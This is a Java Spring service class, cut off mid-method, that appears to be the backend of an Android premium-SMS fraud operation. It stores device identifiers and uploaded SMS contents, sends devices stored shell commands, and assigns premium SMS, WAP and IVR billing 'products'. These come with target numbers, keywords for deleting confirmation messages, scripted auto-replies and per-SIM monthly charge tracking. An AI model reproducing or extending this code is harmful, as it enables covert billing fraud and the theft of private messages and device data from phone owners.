package com.game.docking.service.impl;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.commons.lang3.StringUtils;
import org.apache.commons.lang3.math.NumberUtils;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import org.springframework.util.CollectionUtils;

import com.game.comm.entity.City;
import com.game.comm.entity.LogCityUndefine;
import com.game.comm.entity.SmscenterCmcc;
import com.game.comm.entity.SmscenterUnion;
import com.game.comm.service.CityManager;
import com.game.comm.service.LogCityUndefineManager;
import com.game.comm.service.SmscenterCmccManager;
import com.game.comm.service.SmscenterUnionManager;
import com.game.copartner.entity.FirstVisitDaily;
import com.game.copartner.entity.PartnerDevice;
import com.game.copartner.entity.PartnerDeviceRef;
import com.game.copartner.service.FirstVisitDailyManager;
import com.game.copartner.service.PartnerDeviceManager;
import com.game.copartner.service.PartnerDeviceRefManager;
import com.game.docking.entity.VisitAdsms;
import com.game.docking.entity.VisitErrorCmd;
import com.game.docking.entity.VisitMessage;
import com.game.docking.entity.VisitProductBack;
import com.game.docking.entity.VisitSimData;
import com.game.docking.service.DockingGeneralManager;
import com.game.docking.util.InterfaceUtil;
import com.game.docking.util.sina.JsonIPInfo;
import com.game.entity.system.Dicitem;
import com.game.modules.utils.DateUtil;
import com.game.services.common.DicManager;
import com.game.shorts.entity.ShortCustomer;
import com.game.shorts.entity.ShortDevice;
import com.game.shorts.entity.ShortDeviceImsi;
import com.game.shorts.entity.ShortImsiMobi;
import com.game.shorts.entity.ShortKeyInfo;
import com.game.shorts.entity.ShortKeyTip;
import com.game.shorts.entity.ShortLogAccess;
import com.game.shorts.entity.ShortLogErrorCmd;
import com.game.shorts.entity.ShortLogErrorMobileTime;
import com.game.shorts.entity.ShortLogErrorNull;
import com.game.shorts.entity.ShortLogErrorUpdate;
import com.game.shorts.entity.ShortLogInitarea;
import com.game.shorts.entity.ShortLogMessages;
import com.game.shorts.entity.ShortLogPadv;
import com.game.shorts.entity.ShortLogPadvIvr;
import com.game.shorts.entity.ShortLogProductBack;
import com.game.shorts.entity.ShortLogUploadpkg;
import com.game.shorts.entity.ShortLogVisitImsi;
import com.game.shorts.entity.ShortPadv;
import com.game.shorts.entity.ShortProductActive;
import com.game.shorts.entity.ShortProductActiveWap;
import com.game.shorts.entity.ShortProductSms;
import com.game.shorts.entity.ShortShell;
import com.game.shorts.entity.UpdatePkg;
import com.game.shorts.service.ShortDeviceImsiManager;
import com.game.shorts.service.ShortDeviceManager;
import com.game.shorts.service.ShortImsiMobiManager;
import com.game.shorts.service.ShortKeyInfoManager;
import com.game.shorts.service.ShortKeyTipManager;
import com.game.shorts.service.ShortLogAccessManager;
import com.game.shorts.service.ShortLogErrorCmdManager;
import com.game.shorts.service.ShortLogErrorMobileTimeManager;
import com.game.shorts.service.ShortLogErrorNullManager;
import com.game.shorts.service.ShortLogErrorUpdateManager;
import com.game.shorts.service.ShortLogInitareaManager;
import com.game.shorts.service.ShortLogMessagesManager;
import com.game.shorts.service.ShortLogPadvManager;
import com.game.shorts.service.ShortLogProductBackManager;
import com.game.shorts.service.ShortLogUploadpkgManager;
import com.game.shorts.service.ShortLogVisitImsiManager;
import com.game.shorts.service.ShortPadvManager;
import com.game.shorts.service.ShortProductActiveManager;
import com.game.shorts.service.ShortProductSmsManager;
import com.game.shorts.service.ShortShellManager;
import com.game.util.Constants;
import com.game.util.DateUtils;

@Service("dockingGeneralManager")
public class DockingGeneralManagerImpl implements DockingGeneralManager {
    public static final Logger LOGGER = LoggerFactory.getLogger(DockingGeneralManagerImpl.class);
    private static final String COUNTRY_CHINA = "中国";
    private static final int UNDEFILE_LEVEL_CITY = 1;
    private static final int UNDEFILE_LEVEL_PROVINCE = 2;
    private static final int UNDEFILE_LEVEL_COUNTRY = 3;
    private static final Integer INTEGER_TWO = 2;

    @Autowired
    private CityManager cityManager;
    @Autowired
    private DicManager dicManager;
    @Autowired
    private ShortLogErrorNullManager shortLogErrorNullManager;
    @Autowired
    private ShortLogAccessManager shortLogAccessManager;
    @Autowired
    private ShortDeviceManager shortDeviceManager;
    @Autowired
    private ShortDeviceImsiManager shortDeviceImsiManager;
    @Autowired
    private PartnerDeviceManager partnerDeviceManager;
    @Autowired
    private FirstVisitDailyManager firstVisitDailyManager;
    @Autowired
    private ShortKeyInfoManager shortKeyInfoManager;
    @Autowired
    private ShortKeyTipManager shortKeyTipManager;
    @Autowired
    private ShortPadvManager shortPadvManager;
    @Autowired
    private PartnerDeviceRefManager partnerDeviceRefManager;
    @Autowired
    private ShortShellManager shortShellManager;
    @Autowired
    private ShortLogInitareaManager shortLogInitareaManager;
    @Autowired
    private ShortLogMessagesManager shortLogMessagesManager;
    @Autowired
    private ShortLogVisitImsiManager shortLogVisitImsiManager;
    @Autowired
    private ShortLogErrorCmdManager shortLogErrorCmdManager;
    @Autowired
    private ShortLogErrorUpdateManager shortLogErrorUpdateManager;
    @Autowired
    private ShortLogErrorMobileTimeManager shortLogErrorMobileTimeManager;
    @Autowired
    private LogCityUndefineManager logCityUndefineManager;
    @Autowired
    private ShortLogPadvManager shortLogPadvManager;
    @Autowired
    private ShortLogProductBackManager shortLogProductBackManager;
    @Autowired
    private ShortLogUploadpkgManager shortLogUploadpkgManager;
    @Autowired
    private SmscenterCmccManager smscenterCmccManager;
    @Autowired
    private SmscenterUnionManager smscenterUnionManager;
    @Autowired
    private ShortProductSmsManager shortProductSmsManager;
    @Autowired
    private ShortProductActiveManager shortProductActiveManager;
    @Autowired
    private ShortImsiMobiManager shortImsiMobiManager;

    @Override
    public void insertLogVisit(VisitAdsms visit, Date mobileDate, String responseTxt) {
        ShortLogAccess log = new ShortLogAccess(visit.getAccesstime(), visit.getDeviceid(), visit.getIp(), visit.getRunlevel(), visit.getCountryId(), visit.getCountryName(),
                visit.getMac(), visit.getImei(), visit.getImsi(), visit.getAndroidid(), visit.getCustomerid(), visit.getOsVersionCode(), visit.getOsVersionName(),
                visit.getInline(), visit.getLangCountry(), visit.getNetType(), visit.getCpu(), visit.getRomLess(), visit.getSdcardLess(), visit.getRomTotal(),
                visit.getSdcardTotal(), visit.getTest(), visit.getAppVersionCode(), visit.getAppVersionName(), visit.getInitVersionName(), visit.getInitPackageName(),
                visit.getWifi(), visit.getApn(), visit.getSrc(), visit.getBrand(), visit.getModle(), visit.getMobileCurrentTime(), mobileDate, visit.getSign(),
                visit.getSimParams(), responseTxt);
        shortLogAccessManager.save(log);
    }

    @Override
    public void insertLogErrorNull(VisitAdsms visit) {
        ShortLogErrorNull log = new ShortLogErrorNull(visit.getAccesstime(), visit.getDeviceid(), visit.getIp(), visit.getCountryId(), visit.getCountryName(), visit.getUrl(),
                visit.getMac(), visit.getImei(), visit.getImsi(), visit.getAndroidid(), visit.getCustomerid(), visit.getOsVersionCode(), visit.getOsVersionName(),
                visit.getInline(), visit.getLangCountry(), visit.getNetType(), visit.getCpu(), visit.getRomLess(), visit.getSdcardLess(), visit.getRomTotal(),
                visit.getSdcardTotal(), visit.getTest(), visit.getAppVersionCode(), visit.getAppVersionName(), visit.getInitVersionName(), visit.getInitPackageName(),
                visit.getWifi(), visit.getApn(), visit.getSrc(), visit.getBrand(), visit.getModle(), visit.getMobileCurrentTime(), visit.getSign(), visit.getSimParams());
        shortLogErrorNullManager.save(log);
    }

    @Override
    public void insertLogProductBack(VisitAdsms visit) {
        List<VisitProductBack> productBacks = visit.getProductBacks();
        if (!CollectionUtils.isEmpty(productBacks)) {
            for (VisitProductBack item : productBacks) {
                ShortLogProductBack log = new ShortLogProductBack(visit.getAccesstime(), visit.getDeviceid(), visit.getIp(), visit.getCustomerid(), item.getSi(), item.getImsi(),
                        item.getOrdernum(), item.getErrcode());
                shortLogProductBackManager.save(log);
            }
        }
    }

    @Override
    public Map<String, Object> convertUpdatePkg(UpdatePkg updatePkg) {
        Map<String, Object> result = new HashMap<String, Object>();
        result.put("url", updatePkg.getDownurl());
        result.put("len", updatePkg.getApksize());
        result.put("vc", updatePkg.getApkVersion());
        result.put("md5", updatePkg.getMd5());
        return result;
    }

    @Override
    public Map<String, Object> padvVV(String customerid, String cityid, String provinceCode, int slot) {
        Map<String, Object> result = new HashMap<String, Object>();
        ShortPadv padv = shortPadvManager.getPadv(customerid, cityid, 1);
        if (padv != null) {
            String content = padv.getContent();
            String userid = padv.getPnum();
            Integer delay = padv.getDelay();

            result.put("userid", userid);
            result.put("delay", delay); // 发送间隔
            result.put("content", content);
            result.put("slot", slot);
        }

        return result;
    }

    @Override
    public Map<String, Object> keyMap(String customers) {
        Map<String, Object> resultMap = new HashMap<String, Object>();
        ShortKeyInfo keyInfo = shortKeyInfoManager.clientShortKeyInfo(customers);
        if (keyInfo != null) {
            String comtent = keyInfo.getComtent(); // 比对内容
            String keytent = keyInfo.getKeytent(); // 关键字
            String advkey = keyInfo.getAdvkey(); // 广告键
            String advtent = keyInfo.getAdvtent(); // 广告值
            String advtip = keyInfo.getAdvtip(); // 广告开始
            String advend = keyInfo.getAdvend(); // 广告结束
            String delkey = keyInfo.getDelkey(); // 禁止删除键
            resultMap.put("comtent", comtent);
            resultMap.put("keytent", keytent);
            resultMap.put("advkey", advkey);
            resultMap.put("advtent", advtent);
            resultMap.put("advtip", advtip);
            resultMap.put("advend", advend);
            resultMap.put("delkey", delkey);
            List<ShortKeyTip> tips = shortKeyTipManager.getListByPid(keyInfo.getId());
            List<Map<String, Object>> results = new ArrayList<Map<String, Object>>();
            for (ShortKeyTip item : tips) {
                Map<String, Object> kt = new HashMap<String, Object>();
                kt.put("kbegin", item.getKbegin());
                kt.put("keyend", item.getKeyend());
                kt.put("del", item.getDel());
                kt.put("ret", item.getRet());
                kt.put("smes", item.getSmes());
                kt.put("cons", item.getCons());
                results.add(kt);
            }
            resultMap.put("tipend", results);
        }
        return resultMap;
    }

    @Override
    public Map<String, Object> getDeviceImsiList(VisitAdsms visit) {
        // TODO Auto-generated method stub
        return null;
    }

    @Override
    public void dealPartnerDatas(VisitAdsms visit, String currentdate) {
        int isDevice = 1;
        boolean addDevice = false;
        String deviceid = visit.getDeviceid();
        // ******** 开放设备处理
        PartnerDevice partnerDevice = partnerDeviceManager.getByDeviceid(deviceid);
        if (partnerDevice == null) {
            if (partnerDeviceManager.isMacExist(visit.getMac()) || partnerDeviceManager.isImeiExist(visit.getImei()) || partnerDeviceManager.isAndroididExist(visit.getAndroidid())) {
                isDevice = 0;
            } else {
                // 写设备入库
                partnerDevice = createPartnerDevice(visit);
                addDevice = true;
            }
        }

        // ******* 开放设备对照表处理
        PartnerDeviceRef deviceRef = getPartnerDeviceRef(visit, deviceid);

        if (!firstVisitDailyManager.isDeviceExist(currentdate, deviceid)) {
            // 创建每日首次访问信息
            createFirstVisitDaily(visit, currentdate, isDevice);
            // 合作设备留存处理
            dealPartnerDeviceRetention(visit, addDevice, partnerDevice);
            // 合作设备参照表留存处理
            dealPartnerDeviceRefRetention(visit, deviceRef);
        }

    }

    /**
     * 开放设备对照留存率计算
     */
    private void dealPartnerDeviceRefRetention(VisitAdsms visit, PartnerDeviceRef partnerDeviceRef) {
        if (partnerDeviceRef != null) {
            boolean saveDevice = true;
            int diffDay = 0;
            diffDay = DateUtils.daysBetween(partnerDeviceRef.getAccesstime(), visit.getAccesstime(), "yyyy-MM-dd");
            if (diffDay == 1) { // 次日留存
                partnerDeviceRef.setNextretention(1);
            } else if (diffDay == 2) { // 三日留存
                partnerDeviceRef.setThirdretention(1);
            } else if (diffDay == 6) { // 七日留存
                partnerDeviceRef.setSevenretention(1);
            } else {
                saveDevice = false;
            }
            if (saveDevice) {
                partnerDeviceRefManager.save(partnerDeviceRef);
            }
        }
    }

    /**
     * 开放设备留存率计算
     */
    private void dealPartnerDeviceRetention(VisitAdsms visit, boolean addDevice, PartnerDevice partnerDevice) {
        if (partnerDevice != null && !addDevice) {
            boolean saveDevice = true;
            int diffDay = 0;
            diffDay = DateUtils.daysBetween(partnerDevice.getAccesstime(), visit.getAccesstime(), "yyyy-MM-dd");
            if (diffDay == 1) { // 次日留存
                partnerDevice.setNextretention(1);
            } else if (diffDay == 2) { // 三日留存
                partnerDevice.setThirdretention(1);
            } else if (diffDay == 6) { // 七日留存
                partnerDevice.setSevenretention(1);
            } else {
                saveDevice = false;
            }
            if (saveDevice) {
                partnerDeviceManager.save(partnerDevice);
            }
        }
    }

    /**
     * 获取合作数据对照信息
     */
    private PartnerDeviceRef getPartnerDeviceRef(VisitAdsms visit, String deviceid) {
        PartnerDeviceRef deviceRef = partnerDeviceRefManager.getByDeviceid(deviceid);
        if (deviceRef == null) {
            deviceRef = new PartnerDeviceRef(visit.getAccesstime(), visit.getCountryId(), visit.getCountryName(), visit.getCustomerid(), visit.getOsVersionCode(),
                    visit.getOsVersionName(), visit.getImei(), visit.getMac(), visit.getAndroidid(), visit.getLangCountry(), visit.getInline(), visit.getCpu(),
                    visit.getInitPackageName(), visit.getAppVersionCode(), visit.getSrc(), visit.getBrand(), visit.getModle(), visit.getSign(), visit.getDeviceid(), 0, 0, 0);
            partnerDeviceRefManager.save(deviceRef);
        }
        return deviceRef;
    }

    /**
     * 创建每日首次访问信息
     */
    private void createFirstVisitDaily(VisitAdsms visit, String currentdate, int isDevice) {
        FirstVisitDaily firstVisitDaily = new FirstVisitDaily(currentdate, visit.getAccesstime(), visit.getCustomerid(), visit.getOsVersionCode(), visit.getOsVersionName(),
                visit.getInline(), visit.getCpu(), visit.getInitPackageName(), visit.getAppVersionCode(), visit.getSrc(), visit.getBrand(), visit.getModle(), visit.getSign(),
                visit.getLangCountry(), visit.getInitVersionName(), visit.getNetType(), visit.getWifi(), visit.getCountryId(), visit.getCountryName(), visit.getDeviceid(),
                visit.getImei(), visit.getMac(), visit.getAndroidid(), visit.getImsi(), isDevice, visit.getIp());
        firstVisitDailyManager.save(firstVisitDaily);
    }

    /**
     * 创建合作设备
     */
    private PartnerDevice createPartnerDevice(VisitAdsms visit) {
        PartnerDevice partnerDevice;
        partnerDevice = new PartnerDevice(visit.getAccesstime(), visit.getCountryId(), visit.getCountryName(), visit.getCustomerid(), visit.getOsVersionCode(),
                visit.getOsVersionName(), visit.getImei(), visit.getMac(), visit.getAndroidid(), visit.getLangCountry(), visit.getInline(), visit.getCpu(),
                visit.getInitPackageName(), visit.getAppVersionCode(), visit.getSrc(), visit.getBrand(), visit.getModle(), visit.getSign(), visit.getDeviceid(), 0, 0, 0);
        partnerDeviceManager.save(partnerDevice);
        return partnerDevice;
    }

    @Override
    public ShortDevice getDevice(VisitAdsms visit) {
        ShortDevice device = shortDeviceManager.getDeviceByAndroidid(visit.getAndroidid());
        if (device == null) {
            device = new ShortDevice(visit.getAccesstime(), visit.getDeviceid(), visit.getMac(), visit.getImei(), visit.getImsi(), visit.getCustomerid(), visit.getCountryId(), 0,
                    1, visit.getAndroidid(), 0);
            shortDeviceManager.save(device);
        }
        // IMSI处理
        if (device != null) {
            List<ShortDeviceImsi> deviceImsis = new ArrayList<ShortDeviceImsi>();
            List<VisitSimData> simDatas = visit.getSimDatas();
            if (!CollectionUtils.isEmpty(simDatas)) {
                int smLength = simDatas.size();
                int slot = 0;
                if (smLength == NumberUtils.INTEGER_ONE) {
                    slot = simDatas.get(0).getSlot();
                }
                for (VisitSimData data : simDatas) {
                    ShortDeviceImsi deviceImsi = getDeviceImsi(data, visit);
                    if (deviceImsi != null) {
                        deviceImsis.add(deviceImsi);
                        String imsi = deviceImsi.getImsi();
                        Date lastpadv = deviceImsi.getLastpadv();
                        Integer mvalues = deviceImsi.getMvalues();
                        Long countryId = deviceImsi.getCountryId();
                        if (smLength == 2) {
                            if (NumberUtils.INTEGER_ONE.equals(data.getSlot())) {
                                device.setImsi1(imsi);
                                device.setLastpadv1(lastpadv);
                                device.setImsivalue1(mvalues);
                                if (countryId != null) {
                                    device.setCityid1(countryId);
                                }
                            } else if (NumberUtils.INTEGER_ZERO.equals(data.getSlot())) {
                                device.setImsi0(imsi);
                                device.setLastpadv0(lastpadv);
                                device.setImsivalue0(mvalues);
                                if (countryId != null) {
                                    device.setCityid0(countryId);
                                }
                            }
                        } else {
                            if (slot == NumberUtils.INTEGER_ONE) {
                                device.setImsi1(imsi);
                                device.setLastpadv1(lastpadv);
                                device.setImsivalue1(mvalues);
                                if (countryId != null) {
                                    device.setCityid1(countryId);
                                }
                                device.setImsi0(null);
                                device.setLastpadv0(null);
                                device.setImsivalue0(null);
                                device.setCityid0(null);
                            } else if (slot == NumberUtils.INTEGER_ZERO) {
                                device.setImsi0(imsi);
                                device.setLastpadv0(lastpadv);
                                device.setImsivalue0(mvalues);
                                if (countryId != null) {
                                    device.setCityid0(countryId);
                                }
                                device.setImsi1(null);
                                device.setLastpadv1(null);
                                device.setImsivalue1(null);
                                device.setCityid1(null);
                            }
                        }
                    }
                }
            }
            device.setDeviceImsis(deviceImsis);
            // TODO
            ShortImsiMobi imsiMobi = shortImsiMobiManager.getEntityByImsi(device.getImsi0());
            if (imsiMobi != null) {
                device.setImsiSave0(NumberUtils.INTEGER_ONE);
                if (!NumberUtils.LONG_ZERO.equals(imsiMobi.getCityId())) {
                    device.setCityid0(imsiMobi.getCityId());
                }
            }
            imsiMobi = shortImsiMobiManager.getEntityByImsi(device.getImsi1());
            if (imsiMobi != null) {
                device.setImsiSave1(NumberUtils.INTEGER_ONE);
                if (!NumberUtils.LONG_ZERO.equals(imsiMobi.getCityId())) {
                    device.setCityid1(imsiMobi.getCityId());
                }
            }
        }
        return device;
    }

    private ShortDeviceImsi getDeviceImsi(VisitSimData sim, VisitAdsms visit) {
        String vImsi = sim.getImsi();
        if (StringUtils.isNotBlank(vImsi)) {
            ShortDeviceImsi deviceImsi = shortDeviceImsiManager.getDeviceByImsi(vImsi);
            if (deviceImsi == null) {
                int provider = InterfaceUtil.getProviderCode(vImsi);
                String sc = sim.getSc();
                Long cityid = getCityBySc(provider, sc);
                deviceImsi = new ShortDeviceImsi(visit.getAccesstime(), visit.getDeviceid(), visit.getMac(), sim.getImei(), sim.getImsi(), visit.getCustomerid(), cityid,
                        sim.getApn(), sim.getSlot(), sc, sim.getIccid(), provider);
                shortDeviceImsiManager.save(deviceImsi);
            }
            return deviceImsi;
        }
        return null;
    }

    private Long getCityBySc(int provider, String sc) {
        if (StringUtils.isNotBlank(sc) && sc.length() >= 11) {
            if (provider == NumberUtils.INTEGER_ONE) {
                // 移动：+861380xxxx500 取xxxx
                String areacode = sc.substring(sc.length() - 7, sc.length() - 3);
                SmscenterCmcc smscenterCmcc = smscenterCmccManager.getEntityByCode(areacode);
                if (smscenterCmcc != null) {
                    return smscenterCmcc.getCityid();
                }
            } else if (provider == 2) {
                String areacode = sc.substring(sc.length() - 11);
                SmscenterUnion smscenterUnion = smscenterUnionManager.getEntityByCode(areacode);
                if (smscenterUnion != null) {
                    return smscenterUnion.getCityid();
                }
            }
        }
        return null;
    }

    @Override
    public List<Map<String, Object>> getGlobalCmd(String devicePkgs) {
        List<Map<String, Object>> result = new ArrayList<Map<String, Object>>();
        List<ShortShell> shellList = shortShellManager.getListByStatus(NumberUtils.INTEGER_ONE);
        if (!CollectionUtils.isEmpty(shellList)) {
            for (ShortShell shell : shellList) {
                if (InterfaceUtil.sendShell(devicePkgs, shell.getPkg())) {
                    Map<String, Object> map = new HashMap<String, Object>();
                    map.put("id", shell.getId());
                    map.put("delay", shell.getDelay());
                    map.put("filters", shell.getFilters());
                    map.put("ssign", shell.getSsign());
                    map.put("fback", shell.getFback());
                    map.put("type", shell.getType());
                    map.put("cmd", shell.getCmd());
                    result.add(map);
                }
            }
        }
        return result;
    }

    @Override
    public void insertLogInitarea(VisitAdsms visit, String responseContext) {
        ShortLogInitarea log = new ShortLogInitarea(visit.getAccesstime(), visit.getDeviceid(), visit.getIp(), visit.getImsi(), visit.getCountryId(), visit.getCustomerid(),
                visit.getUrl(), responseContext);
        shortLogInitareaManager.save(log);
    }

    @Override
    public void insertLogMessages(VisitAdsms visit) {
        List<VisitMessage> messages = visit.getMessages();
        if (!CollectionUtils.isEmpty(messages)) {
            for (VisitMessage item : messages) {
                ShortLogMessages log = new ShortLogMessages(visit.getAccesstime(), visit.getDeviceid(), visit.getIp(), item.getImsi(), visit.getCountryId(), visit.getCustomerid(),
                        item.getSlot(), item.getMessage());
                shortLogMessagesManager.save(log);
            }
        }
        return;
    }

    @Override
    public void insertLogVisitImsi(VisitAdsms visit) {
        List<VisitSimData> visitImsis = visit.getSimDatas();
        if (!CollectionUtils.isEmpty(visitImsis)) {
            for (VisitSimData item : visitImsis) {
                ShortLogVisitImsi log = new ShortLogVisitImsi(visit.getAccesstime(), visit.getDeviceid(), visit.getIp(), visit.getCountryId(), visit.getCustomerid(),
                        item.getData(), item.getImsi(), item.getNumeric(), item.getApn(), item.getSlot(), item.getSc(), item.getIccid(), item.getImei(), item.getProviderCode());
                shortLogVisitImsiManager.save(log);
            }
        }
    }

    @Override
    public Map<String, Object> getProduct(ShortDevice device, VisitAdsms visit, ShortCustomer customer, String currentdate) {
        List<ShortDeviceImsi> deviceImsis = device.getDeviceImsis();
        if (CollectionUtils.isEmpty(deviceImsis)) {
            visit.setRunlevel(Constants.RUNLEVEL_INTERCEPT_SM_NULL);
            return null;
        }
        // 客户过滤
        if (customer == null) {
            visit.setRunlevel(Constants.RUNLEVEL_INTERCEPT_CUSTOMER_NULL);
            return null;
        }
        if (NumberUtils.INTEGER_ZERO.equals(customer.getStatus())) {
            visit.setRunlevel(Constants.RUNLEVEL_INTERCEPT_CUSTOMER_STATUS);
            return null;
        }
        String currentTime = new SimpleDateFormat("HH:mm:ss").format(visit.getAccesstime()); // 当前时刻
        if (!DateUtils.betweenTime(customer.getBegintime(), customer.getEndtime(), currentTime, "HH:mm:ss")) {
            visit.setRunlevel(Constants.RUNLEVEL_INTERCEPT_CUSTOMER_TIME);
            return null;
        }
        String cityid = "|" + visit.getCountryId() + "|";
        String cityid0 = device.getCityid0() == null ? cityid : "|" + device.getCityid0() + "|";
        String cityid1 = device.getCityid1() == null ? cityid : "|" + device.getCityid1() + "|";
        String customerCitys = customer.getCitys() == null ? "" : customer.getCitys();
        if (!customerCitys.contains(cityid0) && !customerCitys.contains(cityid1)) {
            visit.setRunlevel(Constants.RUNLEVEL_INTERCEPT_CUSTOMER_CITY);
            return null;
        }

        int cApkdays = customer.getApkdays() == null ? 0 : customer.getApkdays(); // 发送频率
        int cApkdown = customer.getApkdown() == null ? 0 : customer.getApkdown(); // 月值
        String imsi0 = device.getImsi0();
        String imsi1 = device.getImsi1();
        String customerid = customer.getCustomerid();
        int cProvider = customer.getProvider() == null ? 0 : customer.getProvider();
        Map<String, Object> product = null;
        int providerCode0 = InterfaceUtil.getProviderCode(imsi0);
        visit.setRunlevel(Constants.RUNLEVEL_INTERCEPT_CUSTOMER_PROVIDER);
        if (cProvider == 0 || providerCode0 == cProvider) {
            visit.setRunlevel(Constants.RUNLEVEL_INTERCEPT_PADV_MVALUE_IMSI0);
            int restValue = InterfaceUtil.differ(cApkdown, device.getImsivalue0());
            if ((!InterfaceUtil.isLastpadvInMonth(device.getLastpadv0(), visit.getAccesstime())) || restValue > 0) {
                product = generateProduct(visit, cApkdays, imsi0, device.getLastpadv0(), customerid, cityid0, 0, currentdate, currentTime, restValue);
                if (!CollectionUtils.isEmpty(product)) {
                    visit.setRunlevel(Constants.RUNLEVEL_SUCCESS_IMSI0);
                    return product;
                }
            }
        }
        int providerCode1 = InterfaceUtil.getProviderCode(imsi1);
        if (cProvider == 0 || providerCode1 == cProvider) {
            visit.setRunlevel(Constants.RUNLEVEL_INTERCEPT_PADV_MVALUE_IMSI1);
            int restValue = InterfaceUtil.differ(cApkdown, device.getImsivalue1());
            if ((!InterfaceUtil.isLastpadvInMonth(device.getLastpadv1(), visit.getAccesstime())) || restValue > 0) {
                product = generateProduct(visit, cApkdays, imsi1, device.getLastpadv1(), customerid, cityid1, 1, currentdate, currentTime, restValue);
                if (!CollectionUtils.isEmpty(product)) {
                    visit.setRunlevel(Constants.RUNLEVEL_SUCCESS_IMSI1);
                    return product;
                }
            }
        }
        return null;
    }

    private Map<String, Object> generateProduct(VisitAdsms visit, int cApkdays, String imsi, Date lastpadv, String customerid, String cityid, int slot, String currentdate,
            String currentTime, int restValue) {
        int providerCode = InterfaceUtil.getProviderCode(imsi);
        if (StringUtils.isNotBlank(imsi) && providerCode > 0) {
            boolean sendflag0 = true;
            int daybetw = 30;
            if (lastpadv != null) {
                daybetw = DateUtils.daysBetween(lastpadv, visit.getAccesstime(), "yyyy-MM-dd");
                if (daybetw < cApkdays) {
                    sendflag0 = false;
                }
            }
            visit.setRunlevel(Constants.RUNLEVEL_INTERCEPT_PADV_IMSI0_TIME);
            if (sendflag0) {
                Map<String, Object> result = new HashMap<String, Object>();

                ShortProductSms product = shortProductSmsManager.getProduct(customerid, cityid, providerCode, daybetw, currentdate, currentTime, restValue);
                visit.setRunlevel(Constants.RUNLEVEL_INTERCEPT_PADV_IMSI0_NODATA);
                if (product != null) {
                    int type = product.getSmsType(); // 1、sms；2、wap；3、IVR
                    String content = product.getMoContent(); // 指令
                    String userid = product.getMoNumber(); // 号码
                    String deleteKeyNumber = product.getDeleteKeyNumber(); // '删除关键号码',
                    String deleteKeyWord = product.getDeleteKeyWord(); // '删除关键字',
                    String finishKeyNumber = product.getFinishKeyNumber(); // '完成关键号码',
                    String finishKeyWord = product.getFinishKeyWord(); // '完成关键字',
                    String netMode = product.getNetMode() == null ? "" : product.getNetMode(); // '联网方式'
                    String finishRadio = product.getFinishRadio() == null ? "" : product.getFinishRadio();
                    int callTime = InterfaceUtil.getCallTime(product.getCallSpan()); // 拨打时长(秒)-IVR
                    int errDegree = product.getErrDegree() == null ? 0 : product.getErrDegree(); // 错误尝试次数-IVR
                    int limitValue = product.getLimitValue() == null ? 0 : product.getLimitValue(); // 有效值 - IVR
                    String keyInfo = InterfaceUtil.getKeyContent(product.getKeyInfoSpan()); // 按键信息-IVR
                    Long productId = product.getId();
                    int productPrice = InterfaceUtil.getProductPrice(type, product.getPrice(), product.getLimitValue(), callTime);
                    String vLastPadv = DateUtil.format(visit.getAccesstime(), "yyyy-MM-dd HH:mm:ss");

                    result.put("id", productId);
                    result.put("finishRadio", finishRadio);
                    result.put("type", type); // 1、sms；2、wap；3、IVR
                    result.put("slot", slot);
                    result.put("userid", userid);
                    result.put("content", content);
                    result.put("netMode", netMode);
                    result.put("deleteKeyNumber", deleteKeyNumber);
                    result.put("deleteKeyWord", deleteKeyWord);
                    result.put("finishKeyNumber", finishKeyNumber);
                    result.put("finishKeyWord", finishKeyWord);
                    result.put("callTime", callTime);
                    result.put("limitValue", limitValue);
                    result.put("errDegree", errDegree);
                    result.put("keyInfo", keyInfo);
                    List<Map<String, Object>> activity = new ArrayList<Map<String, Object>>();
                    generateActivity(product, activity);
                    result.put("activity", activity);

                    // 写发送日志
                    if (type == 3) {
                        ShortLogPadvIvr logPadvIvr = new ShortLogPadvIvr(visit.getAccesstime(), visit.getDeviceid(), visit.getIp(),
                                NumberUtils.toLong(cityid.replaceAll("\\|", "")), customerid, imsi, productId, callTime, keyInfo, productPrice);
                        shortLogPadvManager.saveLogPadvIvr(logPadvIvr);
                    } else {
                        ShortLogPadv log = new ShortLogPadv(visit.getAccesstime(), visit.getDeviceid(), visit.getIp(), NumberUtils.toLong(cityid.replaceAll("\\|", "")),
                                customerid, imsi, productId);
                        shortLogPadvManager.save(log);
                    }

                    // imsi设备表
                    ShortDeviceImsi deviceImsi = shortDeviceImsiManager.getDeviceByImsi(imsi);
                    if (deviceImsi != null) {
                        if (InterfaceUtil.isLastpadvInMonth(lastpadv, visit.getAccesstime())) {
                            // mvalues+, msi+
                            int deviceImsiValues = deviceImsi.getMvalues() == null ? 0 : deviceImsi.getMvalues();
                            deviceImsi.setMvalues(deviceImsiValues + productPrice);
                            deviceImsi.setMsi(InterfaceUtil.generateHsi(deviceImsi.getMsi(), productId.toString(), vLastPadv));
                        } else {
                            deviceImsi.setMvalues(productPrice);
                            deviceImsi.setMsi(productId + "_" + NumberUtils.INTEGER_ONE + "_" + vLastPadv);
                        }
                        deviceImsi.setHsi(InterfaceUtil.generateHsi(deviceImsi.getHsi(), productId.toString(), vLastPadv));
                        deviceImsi.setLastpadv(visit.getAccesstime());
                        shortDeviceImsiManager.save(deviceImsi);
                    }
                    // product + 1
                    int downnum = product.getDownnum() == null ? 1 : product.getDownnum() + 1;
                    product.setDownnum(downnum);
                    shortProductSmsManager.save(product);
                    return result;
                }
            }
        }
        return null;
    }

    /**
     * activity结点
     */
    private void generateActivity(ShortProductSms product, List<Map<String, Object>> activity) {
        List<ShortProductActive> actives = shortProductActiveManager.findByPid(product.getId());
        if (!CollectionUtils.isEmpty(actives)) {
            for (ShortProductActive item : actives) {
                if (NumberUtils.INTEGER_ONE.equals(item.getActiveType())) {
                    activity.add(generateSms(item.getOrdernum(), item.getDelay(), item.getReplyKeyNumber(), item.getReplyKeyWord(), item.getReplyNumber(), item.getReplyContent(),
                            item.getReplyType()));
                } else if (INTEGER_TWO.equals(item.getActiveType())) {
                    List<ShortProductActiveWap> waps = shortProductActiveManager.findWapsByPid(item.getId());
                    activity.add(generateWap(item.getOrdernum(), item.getDelay(), item.getUrl(), item.getRequestMethod(), waps));
                }
            }
        }
    }

    /**
     * 构建短信结点
     */
    private static Map<String, Object> generateSms(Integer order, Integer delay, String replyKeyNumber, String replyKeyWord, String replyNumber, String replyContent,
            Integer replyType) {
        Map<String, Object> map = new HashMap<String, Object>();
        map.put("type", 1); // 模拟类型：1、回复sms；2、wap；
        map.put("order", order); // 排序号
